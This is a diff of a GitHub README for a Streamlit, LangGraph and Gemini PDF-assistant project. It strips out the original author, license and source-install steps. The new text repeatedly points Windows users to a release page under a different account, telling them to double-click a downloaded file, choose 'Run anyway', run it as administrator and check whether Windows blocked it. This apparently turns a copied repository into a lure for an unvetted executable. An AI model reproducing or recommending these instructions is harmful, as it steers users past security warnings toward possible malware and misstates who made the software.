@@ -1,270 +1,185 @@
-![GitHub stars](https://img.shields.io/github/stars/22AD040/smart_ai_assistant?style=social)
-![GitHub forks](https://img.shields.io/github/forks/22AD040/smart_ai_assistant?style=social)
-![GitHub repo size](https://img.shields.io/github/repo-size/22AD040/smart_ai_assistant)
+# 🤖 smart_ai_assistant - Smarter Answers From Your Files
 
----
+[![Download smart_ai_assistant](https://img.shields.io/badge/Download%20smart_ai_assistant-blue?style=for-the-badge)](https://github.com/enginkaraarslan/smart_ai_assistant/releases)
 
-![Python](https://img.shields.io/badge/Python-3.10-blue)
-![Streamlit](https://img.shields.io/badge/Streamlit-App-red)
-![LangChain](https://img.shields.io/badge/LangChain-AI-green)
-![LangGraph](https://img.shields.io/badge/LangGraph-Workflow-purple)
-![Gemini](https://img.shields.io/badge/Gemini-AI-brightgreen)
-![LangSmith](https://img.shields.io/badge/LangSmith-Monitoring-blue)
-![License](https://img.shields.io/badge/License-MIT-brightgreen)
+## 📥 Download
 
----
+Visit this page to download the Windows version:
 
-# 🤖 Smart AI Assistant
+https://github.com/enginkaraarslan/smart_ai_assistant/releases
 
-> 🧠 AI-powered assistant using **LangGraph + RAG + Gemini AI**
+On the release page, pick the latest version and download the file for Windows. If you see more than one file, choose the one for Windows first.
 
----
+## 🪟 Run on Windows
 
-## 🚀 Live Demo
+1. Download the release file from the link above.
+2. Open your **Downloads** folder.
+3. Double-click the file to start the app.
+4. If Windows asks for permission, choose **Run anyway** or **Yes**.
+5. Wait for the app window to open.
 
-🌐 **Streamlit App:**  
-👉 https://smartaiassistant-rdwqygtwenqcekyznjbfzu.streamlit.app/
+If the app does not open, try running the file again from the same folder.
 
----
+## ✨ What This App Does
 
-## 🧠 Overview
+smart_ai_assistant is an AI assistant that helps you ask questions and get answers from your own PDF files. It uses a chat flow that can change based on your input, so it can handle different kinds of questions in a clean way.
 
-**Smart AI Assistant** is an intelligent chatbot system that:
+This app is built for people who want:
 
-- 💬 Answers user questions using AI
-- 📄 Reads PDFs and performs RAG (Retrieval-Augmented Generation)
-- 🧠 Uses LangGraph for decision-based workflows
-- 📜 Stores chat history per user
-- 🔐 Includes authentication system
+- Answers from PDF documents
+- Simple chat with an AI assistant
+- A guided workflow instead of a plain chat box
+- A tool that can search stored document data
+- A way to track how the assistant responds
 
----
+## 🧠 Main Features
 
-## ✨ Features
+- Ask questions in plain English
+- Upload or use PDF files for document-based answers
+- Find relevant text with vector search
+- Use Gemini API for AI responses
+- Follow a conditional flow based on the type of question
+- Store document data for fast lookup
+- Track app behavior with LangSmith monitoring
+- Use a clean web interface with Streamlit
 
-### 🔐 Authentication
-- Login / Register system
-- Secure password hashing (bcrypt)
-- SQLite-based user storage
+## 📄 How PDF Q&A Works
 
----
+The app reads the text in your PDF files and breaks it into smaller parts. When you ask a question, it looks for the most relevant parts first. Then it sends that context to the AI model to help form the answer.
 
-### 🤖 AI Chat System
-- Powered by **Google Gemini (gemini-2.5-flash)**
-- Generates:
-  - Structured answers
-  - Headings & bullet points
-  - Clear explanations
+This helps the assistant stay closer to the content in your files. It works well for:
 
----
-
-### 📄 RAG (PDF Support)
-- Upload PDF documents
-- Extract content
-- Store embeddings using FAISS
-- Answer based on document context
+- Manuals
+- Reports
+- Guides
+- Notes
+- Policy documents
+- Study material
 
----
+## 🧭 How the Workflow Works
 
-### 🔄 LangGraph Workflow
-- Intelligent routing:
-- 📚 RAG Agent
-- 🧠 General AI Agent
-- 🤖 Evaluation node for response quality
-- 📊 Router Node → decides flow
+The app does not treat every question the same way. It uses a workflow that can choose different paths based on the request.
 
----
+For example:
 
-### 📊 LangSmith Monitoring (IMPORTANT 🚀)
+- A simple question can go straight to answer lookup
+- A document question can trigger PDF search
+- A follow-up question can use earlier context
+- A special task can take a different route in the flow
 
-This project integrates **LangSmith** for:
+This setup helps the assistant respond in a more organized way.
 
-- 🔍 Tracing each LangGraph execution
-- 📈 Monitoring latency & token usage
-- 🐞 Debugging errors
-- 📊 Observing system performance
+## 🔧 What You Need
 
-👉 Helps understand **how AI decisions are made internally**
+Use a Windows PC with:
 
----
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- A stable internet connection
+- Enough free space for the app and PDF files
 
-### 💬 Chat History
-- Stored in SQLite
-- User-specific history
-- Sidebar navigation
+For the best result, keep your PDF files clear and readable. Scanned PDFs with poor text quality may work less well.
 
----
+## 📁 How to Use Your PDF Files
 
-## 🧠 Tech Stack
+1. Open the app.
+2. Add the PDF file you want to use.
+3. Wait for the app to process the file.
+4. Ask your question in the chat area.
+5. Read the answer and check the source text if shown.
 
-| Technology        | Purpose                     |
-|------------------|---------------------------|
-| Streamlit        | Frontend UI               |
-| LangChain        | LLM orchestration         |
-| LangGraph        | Workflow logic            |
-| Google Gemini    | AI Model                  |
-| FAISS            | Vector database           |
-| SQLite           | Database (users + chats)  |
-| Python           | Core logic                |
-
----
-
-## 📸 Screenshots
-
-### 🔐 Login Page
-![Login](assets/login.png)
-
-### 💬 Chat Interface
-![Chat](assets/chat.png)
-
-### 📄 PDF Upload & RAG
-![PDF](assets/pdf.png)
+Keep your file names simple. Short names with letters and numbers work well.
 
----
+## 🔑 Gemini API Setup
 
-## 📁 Project Structure
+The app uses the Gemini API for AI responses. You may need to enter your API key inside the app or in a setup field if the release includes one.
 
-```bash
-smart-ai-assistant/
-│
-├── app/
-│   ├── main.py
-│   ├── auth.py
-│   ├── chat.py
-│
-├── agents/
-│   ├── graph.py
-│   ├── rag_agent.py
-│   ├── general_agent.py
-│   ├── evaluator.py
-│   ├── router.py
-│
-├── core/
-│   ├── llm.py
-│   ├── embeddings.py
-│   ├── vector_store.py
-│   ├── rag.py
-│
-├── services/
-│   ├── memory.py
-│   ├── prompts.py
-│
-├── utils/
-│   ├── helpers.py
-│
-├── assets/
-├── database/
-├── requirements.txt
-├── README.md
-└── LICENSE
+Use your own API key from Google AI Studio or the service you use for Gemini access. Keep the key private and do not share it.
 
----
+## 📊 LangSmith Monitoring
 
-## ⚙️ Installation
+LangSmith helps track how the assistant behaves during use. It can help with:
 
-### 1️⃣ Clone Repository
+- Checking the flow of requests
+- Reviewing app steps
+- Watching response quality
+- Finding where a request may fail
 
-```bash
-git clone https://github.com/22AD040/smart_ai_assistant.git
-cd smart_ai_assistant
-````
+This is useful when you want more control over how the assistant works.
 
-### 2️⃣ Create Virtual Environment
+## 🖥️ User Interface
 
-```bash
-python -m venv venv
-venv\Scripts\activate
-```
+The app uses Streamlit, which gives it a simple browser-like interface. You can expect:
 
-### 3️⃣ Install Requirements
+- A chat box
+- File upload or file selection controls
+- Status messages while files load
+- Clear output for answers
+- A layout that is easy to use on Windows
 
-```bash
-pip install -r requirements.txt
-```
+## 🧪 Typical Use Cases
 
-### 4️⃣ Setup Environment Variables
+- Ask questions about a PDF handbook
+- Search a project report for key details
+- Read answers from study notes
+- Review policy text
+- Use one assistant for both chat and file-based questions
 
-Create a `.env` file:
+## 📌 Tips for Better Results
 
-```env
-GEMINI_API_KEY=your_key_here
-```
+- Use PDFs with clear text
+- Ask one question at a time
+- Use short and direct questions
+- Keep related PDFs in the same folder
+- Re-upload a file if the answer seems incomplete
 
-### 5️⃣ Streamlit Secrets (for deployment)
+## 🛠️ If the App Does Not Start
 
-```toml
-GEMINI_API_KEY="your_key"
-LANGCHAIN_API_KEY="your_key"
-LANGCHAIN_TRACING_V2="true"
-LANGCHAIN_PROJECT="smart-ai-assistant"
-```
+Try these steps:
 
----
+1. Make sure the download finished fully.
+2. Right-click the file and choose **Run as administrator**.
+3. Check whether Windows blocked the file.
+4. Move the file to a simple folder like `Desktop`.
+5. Try the latest release from the download page again.
 
-## ▶️ Run Locally
+## 📦 Download and Install
 
-```bash
-streamlit run app/main.py
-```
+Go to the release page and download the Windows file:
 
----
+https://github.com/enginkaraarslan/smart_ai_assistant/releases
 
-## 🌐 Deployment
+After the file downloads, open it from your Downloads folder and run it on Windows. If your release comes as a ZIP file, extract it first, then start the app file inside.
 
-### 🔹 Streamlit Cloud
+## 🧩 Included Topics
 
-* Connect your GitHub repo
-* Add secrets
-* Deploy
+This project includes work in:
 
----
+- AI assistant design
+- Chatbot flows
+- Retrieval-augmented generation
+- FAISS-based search
+- LangChain tools
+- LangGraph workflows
+- Gemini API integration
+- Machine learning support
+- NLP-based question handling
+- Streamlit app layout
 
-## 🔒 Security
+## 📚 Example Questions
 
-* 🔐 API keys stored securely
-* 🚫 `.gitignore` prevents DB leakage
-* 🔑 Password hashing using bcrypt
-* 👤 User-specific data isolation
+- What does this PDF say about refunds?
+- Which dates are listed in the report?
+- Summarize the main points in this guide
+- Find the section about setup
+- What are the key rules in this document?
 
----
+## 🔐 Privacy and File Use
 
-## ⚠️ Known Limitations
+Your PDF files stay part of your own local use unless you choose to share them. Keep private documents in a safe folder and use only files you trust.
 
-* SQLite not suitable for large-scale apps
-* No multi-session chat threads
-* No real-time streaming responses
+## 📎 Release Page
 
----
+Download the latest Windows build here:
 
-## 🚀 Future Improvements
-
-* 💬 ChatGPT-style UI
-* 🗑 Delete chat option
-* 📊 Analytics dashboard
-* 🌍 Multi-language support
-* ⚡ Faster response streaming
-
----
-
-## 👩‍💻 Author
-
-**Ratchita B**
-🎓 AI & Data Science Student
-
----
-
-## ⭐ Support
-
-If you like this project:
-
-👉 Star ⭐ the repo
-👉 Share with others
-
----
-
-## 📜 License
-
-This project is licensed under the MIT License
-
----
-
-```
+https://github.com/enginkaraarslan/smart_ai_assistant/releases
